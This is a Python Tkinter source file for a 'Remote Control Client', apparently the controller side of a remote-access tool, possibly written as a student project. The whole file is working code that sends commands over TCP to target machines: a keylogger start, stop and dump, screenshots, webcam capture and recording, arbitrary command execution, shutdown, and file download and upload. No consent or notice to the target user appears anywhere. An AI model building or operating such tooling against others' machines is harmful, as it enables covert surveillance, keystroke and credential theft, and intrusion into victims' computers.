import base64
import json
import os
import socket
import struct
import tkinter as tk
from tkinter import ttk, filedialog, simpledialog, messagebox
from typing import Any, Dict

SERVER_PORT = 12345


def send_message(conn: socket.socket, payload: Dict[str, Any]) -> None:
    data = json.dumps(payload).encode("utf-8")
    header = struct.pack(">I", len(data))
    conn.sendall(header + data)


def recv_exact(conn: socket.socket, size: int) -> bytes:
    buf = b""
    while len(buf) < size:
        chunk = conn.recv(size - len(buf))
        if not chunk:
            raise ConnectionError("connection closed while receiving data")
        buf += chunk
    return buf


def recv_message(conn: socket.socket) -> Dict[str, Any]:
    header = recv_exact(conn, 4)
    (length,) = struct.unpack(">I", header)
    body = recv_exact(conn, length)
    return json.loads(body.decode("utf-8"))


def save_base64_file(data_b64: str, suggested_name: str) -> str:
    path = os.path.abspath(suggested_name)
    with open(path, "wb") as f:
        f.write(base64.b64decode(data_b64.encode("ascii")))
    return path


class RemoteClientUI:
    def __init__(self, root: tk.Tk):
        self.root = root
        self.root.title("Remote Control Client")
        self.root.geometry("1100x650")

        # key = display_name, value = {"conn": socket, "host": str, "logs": [str]}
        self.servers: Dict[str, Dict[str, Any]] = {}
        self.current_server_key: str | None = None

        self.build_ui()

    def build_ui(self):
        # ===== Top bar =====
        top = ttk.Frame(self.root, padding=10)
        top.pack(fill="x")

        ttk.Label(top, text="Server IP:").pack(side="left")
        self.ip_entry = ttk.Entry(top, width=25)
        self.ip_entry.pack(side="left", padx=5)
        self.ip_entry.insert(0, "127.0.0.1")

        self.connect_btn = ttk.Button(top, text="Connect", command=self.connect_server)
        self.connect_btn.pack(side="left", padx=5)

        self.disconnect_btn = ttk.Button(top, text="Disconnect Selected", command=self.disconnect_selected)
        self.disconnect_btn.pack(side="left", padx=5)

        self.status_label = ttk.Label(top, text="No server selected")
        self.status_label.pack(side="left", padx=12)

        # ===== Main layout =====
        main = ttk.Frame(self.root, padding=10)
        main.pack(fill="both", expand=True)

        # Sidebar
        sidebar = ttk.Frame(main, width=240)
        sidebar.pack(side="left", fill="y")
        sidebar.pack_propagate(False)

        ttk.Label(sidebar, text="Connected Servers").pack(anchor="w", pady=(0, 8))

        self.server_listbox = tk.Listbox(sidebar, height=20)
        self.server_listbox.pack(fill="both", expand=True)
        self.server_listbox.bind("<<ListboxSelect>>", self.on_server_select)

        # Right area
        right = ttk.Frame(main)
        right.pack(side="right", fill="both", expand=True, padx=(12, 0))

        # Actions
        action_frame = ttk.Frame(right)
        action_frame.pack(fill="x")

        ttk.Label(action_frame, text="Features").grid(row=0, column=0, columnspan=3, sticky="w", pady=(0, 8))

        buttons = [
            ("Process Running", self.list_processes),
            ("App Running", self.start_app),
            ("Keystroke Start", lambda: self.send_action({"action": "keylog_start"})),
            ("Keystroke Stop", lambda: self.send_action({"action": "keylog_stop"})),
            ("Keystroke Dump", lambda: self.send_action({"action": "keylog_dump"})),
            ("Shutdown", lambda: self.send_action({"action": "shutdown"})),
            ("Screenshot", lambda: self.send_action({"action": "screenshot"})),
            ("Webcam Open", lambda: self.send_action({"action": "webcam_open"})),
            ("Webcam Record Start", lambda: self.send_action({"action": "webcam_record_start"})),
            ("Webcam Record Stop", lambda: self.send_action({"action": "webcam_record_stop"})),
            ("Download File", self.download_file),
            ("Upload File", self.upload_file),
        ]

        for idx, (text, cmd) in enumerate(buttons):
            row = idx // 3 + 1
            col = idx % 3
            ttk.Button(action_frame, text=text, command=cmd, width=24).grid(
                row=row, column=col, padx=4, pady=4, sticky="w"
            )

        # Logs
        log_frame = ttk.Frame(right)
        log_frame.pack(fill="both", expand=True, pady=(12, 0))

        ttk.Label(log_frame, text="Log / Response").pack(anchor="w")

        self.log_text = tk.Text(log_frame, wrap="word")
        self.log_text.pack(fill="both", expand=True, pady=(6, 0))

    def connect_server(self):
        host = self.ip_entry.get().strip()
        if not host:
            messagebox.showwarning("Warning", "Please enter server IP")
            return

        display_name = f"{host}:{SERVER_PORT}"

        if display_name in self.servers:
            messagebox.showinfo("Info", f"{display_name} is already connected")
            return

        try:
            conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            conn.connect((host, SERVER_PORT))

            self.servers[display_name] = {
                "conn": conn,
                "host": host,
                "logs": [f"Connected to {display_name}"]
            }

            self.server_listbox.insert("end", display_name)
            self.select_server_by_name(display_name)

        except Exception as e:
            messagebox.showerror("Connect error", str(e))

    def disconnect_selected(self):
        key = self.current_server_key
        if not key:
            messagebox.showwarning("Warning", "No server selected")
            return

        try:
            conn = self.servers[key]["conn"]
            conn.close()
        except Exception:
            pass

        idx = self.get_selected_index()
        if idx is not None:
            self.server_listbox.delete(idx)

        del self.servers[key]
        self.current_server_key = None

        self.log_text.delete("1.0", "end")
        self.status_label.config(text="No server selected")

        if self.server_listbox.size() > 0:
            self.server_listbox.selection_set(0)
            self.on_server_select(None)

    def get_selected_index(self):
        sel = self.server_listbox.curselection()
        if not sel:
            return None
        return sel[0]

    def get_current_server(self):
        if not self.current_server_key:
            return None
        return self.servers.get(self.current_server_key)

    def select_server_by_name(self, name: str):
        items = self.server_listbox.get(0, "end")
        for i, item in enumerate(items):
            if item == name:
                self.server_listbox.selection_clear(0, "end")
                self.server_listbox.selection_set(i)
                self.server_listbox.activate(i)
                self.on_server_select(None)
                return

    def on_server_select(self, event):
        idx = self.get_selected_index()
        if idx is None:
            return

        key = self.server_listbox.get(idx)
        self.current_server_key = key

        self.status_label.config(text=f"Selected: {key}")
        self.refresh_log_view()

    def refresh_log_view(self):
        self.log_text.delete("1.0", "end")

        server = self.get_current_server()
        if not server:
            return

        for line in server["logs"]:
            self.log_text.insert("end", line + "\n")

        self.log_text.see("end")

    def log(self, msg: str, server_key: str | None = None):
        key = server_key or self.current_server_key
        if not key or key not in self.servers:
            return

        self.servers[key]["logs"].append(msg)

        if key == self.current_server_key:
            self.log_text.insert("end", msg + "\n")
            self.log_text.see("end")

    def ensure_selected_server(self):
        if not self.current_server_key:
            messagebox.showwarning("Warning", "Please select a server first")
            return False
        return True

    def send_action(self, payload: Dict[str, Any]):
        if not self.ensure_selected_server():
            return

        key = self.current_server_key
        server = self.servers[key]
        conn = server["conn"]

        try:
            self.log(f"> Sending: {payload['action']}", key)

            send_message(conn, payload)
            resp = recv_message(conn)

            status = resp.get("status")
            data = resp.get("data")
            encoding = resp.get("encoding")

            if encoding and status == "ok":
                safe_name = key.replace(":", "_")

                if encoding.startswith("base64_png"):
                    path = save_base64_file(data, f"{safe_name}_screenshot.png")
                    self.log(f"Screenshot saved to: {path}", key)

                elif encoding.startswith("base64_jpg"):
                    path = save_base64_file(data, f"{safe_name}_webcam.jpg")
                    self.log(f"Webcam image saved to: {path}", key)

                elif encoding.startswith("base64_mp4"):
                    path = save_base64_file(data, f"{safe_name}_record.mp4")
                    self.log(f"Webcam video saved to: {path}", key)

                elif encoding.startswith("base64_file"):
                    path = save_base64_file(data, f"{safe_name}_download.bin")
                    self.log(f"Downloaded file saved to: {path}", key)

                else:
                    self.log(f"Unknown encoding: {encoding}", key)

            else:
                self.log(f"Status: {status}", key)
                self.log(f"Data: {data}", key)
                self.log("-" * 40, key)

        except Exception as e:
            self.log(f"Connection error: {e}", key)
            messagebox.showerror("Error", str(e))

    def list_processes(self):
        self.send_action({"action": "list_processes"})

    def start_app(self):
        if not self.ensure_selected_server():
            return

        cmd = simpledialog.askstring("App Running", "Nhập lệnh / app cần chạy:")
        if cmd:
            self.send_action({"action": "start_app", "command": cmd})

    def download_file(self):
        if not self.ensure_selected_server():
            return

        remote_path = simpledialog.askstring("Download File", "Đường dẫn file trên máy đích:")
        if remote_path:
            self.send_action({"action": "download", "path": remote_path})

    def upload_file(self):
        if not self.ensure_selected_server():
            return

        local_file = filedialog.askopenfilename(title="Chọn file để upload")
        if not local_file:
            return

        remote_path = simpledialog.askstring("Upload File", "Đường dẫn lưu trên máy đích:")
        if not remote_path:
            return

        try:
            with open(local_file, "rb") as f:
                data_b64 = base64.b64encode(f.read()).decode("ascii")

            self.send_action({
                "action": "upload",
                "path": remote_path,
                "data": data_b64
            })
        except Exception as e:
            messagebox.showerror("Upload error", str(e))


if __name__ == "__main__":
    root = tk.Tk()
    app = RemoteClientUI(root)
    root.mainloop()